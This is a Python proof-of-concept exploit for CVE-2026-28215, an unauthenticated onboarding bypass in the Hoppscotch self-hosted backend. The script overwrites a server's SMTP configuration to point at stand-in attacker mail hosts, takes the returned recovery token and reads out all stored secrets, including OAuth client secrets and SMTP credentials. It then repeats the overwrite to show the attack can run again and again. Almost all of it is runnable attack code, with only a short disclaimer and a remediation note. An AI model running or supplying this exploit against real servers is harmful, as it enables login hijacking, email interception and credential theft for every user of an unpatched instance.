#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Hoppscotch Onboarding Bypass — Config Overwrite & Secret Exfiltration
# CVE            : CVE-2026-28215
# Vendor         : Hoppscotch
# Product        : Hoppscotch Self-Hosted Backend
# Affected       : < 2026.2.0
# Type           : CWE-284 - Improper Access Control
# CVSS           : 9.1 (Critical)
# Platform       : Node.js / Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-28215: Hoppscotch Onboarding Bypass — Config Overwrite & Secret Exfiltration

Demonstrates unauthenticated infrastructure configuration overwrite and secret
exfiltration in Hoppscotch self-hosted backend < 2026.2.0.

ATTACK CHAIN:
  1. Recon: GET /v1/onboarding/status — confirm configured instance
  2. Exploit: POST /v1/onboarding/config with attacker SMTP settings
  3. Exfiltrate: GET /v1/onboarding/config?token=<uuid> — read all secrets
  4. Repeat: demonstrate unlimited unauthenticated overwrites

PREREQUISITES:
  - Hoppscotch self-hosted instance < 2026.2.0
  - Network access to backend API (default port 3170)
  - Python 3.6+ (stdlib only, no external dependencies)

REFERENCES:
  - CVE-2026-28215
  - https://github.com/hoppscotch/hoppscotch/security/advisories/GHSA-jwv8-867r-q9fg
"""
import sys
import json
import time
import http.client
import urllib.parse


# ANSI color codes for output
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

DEFAULT_PORT = 3170
# How long to wait for app restart after config overwrite (seconds)
RESTART_WAIT = 15
# Max retries waiting for app to come back after restart
MAX_RETRIES = 10
RETRY_INTERVAL = 3


def banner():
    print(f"""
{BOLD}{RED}╔══════════════════════════════════════════════════════════════╗
║  CVE-2026-28215 — Hoppscotch Onboarding Bypass PoC         ║
║  Config Overwrite + Secret Exfiltration                     ║
║  Severity: CRITICAL (CVSS 9.1)                              ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")


def http_request(host, port, method, path, body=None, headers=None, timeout=10):
    """Send an HTTP request and return (status, headers, body) tuple."""
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        if headers is None:
            headers = {}
        if body and isinstance(body, dict):
            body = json.dumps(body)
            headers["Content-Type"] = "application/json"
        conn.request(method, path, body=body, headers=headers)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", errors="replace")
        return resp.status, dict(resp.getheaders()), data
    except Exception as e:
        return None, None, str(e)
    finally:
        conn.close()


def wait_for_service(host, port, max_retries=MAX_RETRIES, interval=RETRY_INTERVAL):
    """Wait for the service to come back after restart."""
    print(f"\n{YELLOW}[*] Waiting for service to restart (up to {max_retries * interval}s)...{RESET}")
    for i in range(max_retries):
        time.sleep(interval)
        status, _, body = http_request(host, port, "GET", "/v1/onboarding/status")
        if status == 200:
            print(f"{GREEN}[+] Service is back online (attempt {i+1}/{max_retries}){RESET}")
            return True
        print(f"{YELLOW}    Retry {i+1}/{max_retries} — status: {status}{RESET}")
    return False


def step1_recon(host, port):
    """Step 1: Reconnaissance — Check onboarding status (unauthenticated)."""
    print(f"\n{BOLD}{CYAN}═══ STEP 1: Reconnaissance ═══{RESET}")
    print(f"{YELLOW}[*] Checking onboarding status (GET /v1/onboarding/status)...{RESET}")

    status, _, body = http_request(host, port, "GET", "/v1/onboarding/status")

    if status is None:
        print(f"{RED}[!] Connection failed: {body}{RESET}")
        return None

    if status != 200:
        print(f"{RED}[!] Unexpected status code: {status}{RESET}")
        print(f"    Response: {body}")
        return None

    try:
        data = json.loads(body)
    except json.JSONDecodeError:
        print(f"{RED}[!] Invalid JSON response: {body}{RESET}")
        return None

    onboarding_completed = data.get("onboardingCompleted", False)
    can_rerun = data.get("canReRunOnboarding", False)

    print(f"{GREEN}[+] Status: 200 OK{RESET}")
    print(f"    onboardingCompleted: {onboarding_completed}")
    print(f"    canReRunOnboarding:  {can_rerun}")

    if onboarding_completed:
        print(f"\n{GREEN}[+] Target is a configured instance — onboarding already completed.{RESET}")
        print(f"{RED}[!] VULNERABLE: The endpoint should block re-configuration, but it doesn't!{RESET}")
    else:
        print(f"\n{YELLOW}[*] Target has not completed onboarding yet (fresh instance).{RESET}")
        print(f"    The exploit will perform initial config + demonstrate re-exploitation.{RESET}")

    return data


def step2_overwrite_config(host, port):
    """Step 2: Exploit — Overwrite infrastructure config with attacker-controlled settings."""
    print(f"\n{BOLD}{CYAN}═══ STEP 2: Configuration Overwrite (EXPLOIT) ═══{RESET}")
    print(f"{YELLOW}[*] Sending POST /v1/onboarding/config with attacker-controlled SMTP settings...{RESET}")

    # Attacker-controlled SMTP configuration
    # In a real attack, these would point to attacker infrastructure
    attacker_payload = {
        "VITE_ALLOWED_AUTH_PROVIDERS": "EMAIL",
        "MAILER_SMTP_ENABLE": "true",
        "MAILER_USE_CUSTOM_CONFIGS": "true",
        "MAILER_SMTP_HOST": "evil-smtp.attacker.com",
        "MAILER_SMTP_PORT": "587",
        "MAILER_SMTP_SECURE": "true",
        "MAILER_SMTP_USER": "evil@attacker.com",
        "MAILER_SMTP_PASSWORD": "evil-password-s3cret!",
        "MAILER_ADDRESS_FROM": "noreply@attacker.com",
        "MAILER_TLS_REJECT_UNAUTHORIZED": "true",
    }

    print(f"\n{YELLOW}    Payload:{RESET}")
    for key, value in attacker_payload.items():
        if "PASSWORD" in key or "SECRET" in key:
            print(f"      {key}: {BOLD}{RED}{value}{RESET}")
        else:
            print(f"      {key}: {value}")

    status, headers, body = http_request(host, port, "POST", "/v1/onboarding/config", body=attacker_payload)

    if status is None:
        print(f"\n{RED}[!] Connection failed: {body}{RESET}")
        return None

    print(f"\n{GREEN}[+] Response Status: {status}{RESET}")
    print(f"    Response Body: {body}")

    if status == 201:
        try:
            data = json.loads(body)
            token = data.get("token")
            if token:
                print(f"\n{RED}{BOLD}[!!!] VULNERABILITY CONFIRMED — Config overwritten WITHOUT authentication!{RESET}")
                print(f"{RED}[!!!] Recovery token received: {token}{RESET}")
                print(f"\n{YELLOW}    Impact:{RESET}")
                print(f"      - SMTP config now points to attacker-controlled server")
                print(f"      - All magic-link login emails will be sent to attacker SMTP")
                print(f"      - Recovery token can be used to exfiltrate ALL secrets")
                return token
        except json.JSONDecodeError:
            pass

    if status == 400:
        print(f"\n{GREEN}[*] Server returned 400 — onboarding bypass is BLOCKED (patched version).{RESET}")
        return None

    print(f"\n{RED}[!] Unexpected response — exploit may have failed.{RESET}")
    return None


def step3_exfiltrate_secrets(host, port, token):
    """Step 3: Exfiltrate secrets — Use recovery token to read ALL infrastructure config."""
    print(f"\n{BOLD}{CYAN}═══ STEP 3: Secret Exfiltration ═══{RESET}")
    print(f"{YELLOW}[*] Using recovery token to exfiltrate secrets...{RESET}")
    print(f"    GET /v1/onboarding/config?token={token}")

    path = f"/v1/onboarding/config?token={urllib.parse.quote(token)}"
    status, _, body = http_request(host, port, "GET", path)

    if status is None:
        print(f"\n{RED}[!] Connection failed: {body}{RESET}")
        return None

    print(f"\n{GREEN}[+] Response Status: {status}{RESET}")

    if status == 200:
        try:
            data = json.loads(body)
            print(f"\n{RED}{BOLD}[!!!] ALL INFRASTRUCTURE SECRETS EXFILTRATED:{RESET}")
            print(f"{RED}{'─' * 60}{RESET}")

            sensitive_keys = ["SECRET", "PASSWORD", "CLIENT_ID", "CLIENT_SECRET", "SMTP_USER"]
            for key, value in sorted(data.items()):
                if any(s in key for s in sensitive_keys) and value:
                    print(f"  {RED}{BOLD}{key}: {value}{RESET}")
                elif value:
                    print(f"  {key}: {value}")
                else:
                    print(f"  {YELLOW}{key}: (empty){RESET}")

            print(f"{RED}{'─' * 60}{RESET}")
            print(f"\n{RED}{BOLD}[!!!] Attacker now has access to:{RESET}")

            # Categorize the leaked data
            smtp_leaked = any(k.startswith("MAILER_SMTP") and v for k, v in data.items())
            oauth_leaked = any(("CLIENT_SECRET" in k or "CLIENT_ID" in k) and v for k, v in data.items())

            if smtp_leaked:
                print(f"  {RED}- SMTP credentials (email interception){RESET}")
            if oauth_leaked:
                print(f"  {RED}- OAuth client secrets (SSO hijacking){RESET}")
            print(f"  {RED}- Full authentication provider configuration{RESET}")
            print(f"  {RED}- All callback URLs (redirect hijacking){RESET}")

            return data
        except json.JSONDecodeError:
            print(f"    Raw response: {body}")

    elif status == 401:
        print(f"\n{YELLOW}[*] Token rejected — may have expired or been invalidated.{RESET}")
    else:
        print(f"\n{RED}[!] Unexpected status {status}: {body}{RESET}")

    return None


def step4_verify_persistence(host, port):
    """Step 4: Verify persistence — Confirm attacker config persists after restart."""
    print(f"\n{BOLD}{CYAN}═══ STEP 4: Verify Persistence ═══{RESET}")
    print(f"{YELLOW}[*] Performing second config overwrite to confirm repeatable exploitation...{RESET}")

    # Different attacker payload to prove we can overwrite again
    second_payload = {
        "VITE_ALLOWED_AUTH_PROVIDERS": "EMAIL",
        "MAILER_SMTP_ENABLE": "true",
        "MAILER_USE_CUSTOM_CONFIGS": "true",
        "MAILER_SMTP_HOST": "second-evil-smtp.attacker2.com",
        "MAILER_SMTP_PORT": "465",
        "MAILER_SMTP_SECURE": "true",
        "MAILER_SMTP_USER": "second-evil@attacker2.com",
        "MAILER_SMTP_PASSWORD": "another-evil-password!",
        "MAILER_ADDRESS_FROM": "noreply@attacker2.com",
        "MAILER_TLS_REJECT_UNAUTHORIZED": "true",
    }

    status, _, body = http_request(host, port, "POST", "/v1/onboarding/config", body=second_payload)

    if status == 201:
        try:
            data = json.loads(body)
            token2 = data.get("token")
            print(f"{RED}{BOLD}[!!!] REPEATED EXPLOITATION CONFIRMED — New token: {token2}{RESET}")
            print(f"    The endpoint can be called unlimited times without authentication.")
            print(f"    Each call overwrites the previous configuration and generates a new token.")
            return token2
        except json.JSONDecodeError:
            pass

    print(f"    Status: {status}, Body: {body}")
    return None


def exploit(target_host, target_port):
    """Run the full exploit chain against the target."""
    banner()
    print(f"{BOLD}Target: {target_host}:{target_port}{RESET}")
    print(f"{'═' * 60}")

    success = True

    # ── Step 1: Reconnaissance ──
    recon = step1_recon(target_host, target_port)
    if recon is None:
        print(f"\n{RED}[!] Recon failed — target may be unreachable.{RESET}")
        return False

    # ── Step 2: Config Overwrite (Primary Exploit) ──
    token = step2_overwrite_config(target_host, target_port)
    if token is None:
        print(f"\n{RED}[!] Exploit failed — could not overwrite config.{RESET}")
        return False

    # ── Wait for app restart ──
    # Hoppscotch restarts after config update (stopApp() in updateMany)
    if not wait_for_service(target_host, target_port):
        print(f"\n{RED}[!] Service did not come back after restart.{RESET}")
        return False

    # ── Step 3: Secret Exfiltration ──
    secrets = step3_exfiltrate_secrets(target_host, target_port, token)
    if secrets is None:
        print(f"\n{RED}[!] Secret exfiltration failed.{RESET}")
        success = False

    # ── Step 4: Verify Repeatable Exploitation ──
    token2 = step4_verify_persistence(target_host, target_port)
    if token2:
        # Wait for restart and verify second exfiltration
        if wait_for_service(target_host, target_port):
            secrets2 = step3_exfiltrate_secrets(target_host, target_port, token2)
            if secrets2:
                # Verify the config changed to the second attacker payload
                if secrets2.get("MAILER_SMTP_HOST") == "second-evil-smtp.attacker2.com":
                    print(f"\n{GREEN}{BOLD}[+] Second overwrite verified — config updated to second attacker payload.{RESET}")
                else:
                    print(f"\n{YELLOW}[*] Second overwrite may not have applied fully.{RESET}")

    # ── Summary ──
    print(f"\n{'═' * 60}")
    print(f"{BOLD}{CYAN}═══ EXPLOIT SUMMARY ═══{RESET}")
    print(f"{'═' * 60}")
    if success:
        print(f"""
{GREEN}{BOLD}[+] CVE-2026-28215 CONFIRMED — Hoppscotch Onboarding Bypass{RESET}

{BOLD}Vulnerability:{RESET}
  POST /v1/onboarding/config has no authentication and no
  onboarding-completion check. Any unauthenticated attacker can:

{RED}  1. Overwrite all infrastructure config (OAuth, SMTP, auth providers){RESET}
{RED}  2. Receive a recovery token in the response{RESET}
{RED}  3. Use the token to exfiltrate ALL existing secrets{RESET}
{RED}  4. Repeat the attack unlimited times{RESET}

{BOLD}Impact:{RESET}
  - Full control over authentication flows
  - SMTP email interception (magic-link hijacking)
  - OAuth credential theft (SSO hijacking)
  - Complete account takeover for all users

{BOLD}Remediation:{RESET}
  - Upgrade to Hoppscotch >= 2026.2.0
  - The fix adds an onboarding status check that blocks re-configuration
    when onboarding is completed and users exist
""")
    else:
        print(f"\n{RED}[!] Exploit partially succeeded but secret exfiltration failed.{RESET}")

    return success


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT

    try:
        result = exploit(target, port)
        sys.exit(0 if result else 1)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[*] Interrupted by user.{RESET}")
        sys.exit(130)
    except Exception as e:
        print(f"\n{RED}[!] Unexpected error: {e}{RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
